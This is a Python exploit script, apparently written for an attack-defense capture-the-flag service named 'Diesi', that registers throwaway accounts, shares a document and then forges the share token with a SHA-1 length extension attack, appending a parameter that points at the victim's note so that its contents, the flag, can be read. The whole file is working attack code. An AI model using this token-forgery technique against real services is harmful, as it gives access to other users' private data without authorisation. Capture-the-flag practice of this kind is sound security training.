#!/usr/bin/env python3

import json
import random
import string
import sys
import time
import HashTools
import base64

from interactions import Diesi


def exploit(host: str, flag_id: str) -> str:
    flag_id_d = json.loads(flag_id)
    flag_username, flag_note_id = flag_id_d['username'], int(flag_id_d['note_id'])

    client1 = Diesi(host)

    username1 = ''.join(random.choices(string.ascii_letters, k=16))
    password1 = ''.join(random.choices(string.ascii_letters, k=16))
    
    client1.register_checked(username1, password1)
    
    for i in range(100):
        client2 = Diesi(host)
        username2 = ''.join(random.choices(string.ascii_letters, k=16 + i))
        password2 = ''.join(random.choices(string.ascii_letters, k=16))
        client2.register_checked(username2, password2)

        r = client1.write('title', 'bodyAAAAAAAAAAA')
        document_id = r.url.split('id=')[-1]

        # print(f'Created document {document_id}')

        r = client1.share(document_id, username2)

        # print(r)
        token = r.json()['token']

        print(f'Shared document {document_id} with {username2} using token {token}')
        
        data = token.split('.')[0].encode() 

        append_data = base64.b64encode(b"&document=" + str(flag_note_id).encode() + b"&")

        magic = HashTools.new("sha1")
        new_data, new_sig = magic.extension(
            secret_length=32, original_data=data,
            append_data=append_data, signature=token.split('.')[1]
        )

        token = new_data + b'.' + new_sig.encode()

        print(f'New data: {new_data}')
        # print(f'New signature: {new_sig}')
        # print(f'New token: {token}')

        r = client2.read_shared( token )
        if not 'bodyAAAAAAAAAAA' in r.text:
            return print(r.text)


if __name__ == '__main__':
    host, flag_id = sys.argv[1:3]
    flag = exploit(host, flag_id)
    print(flag)
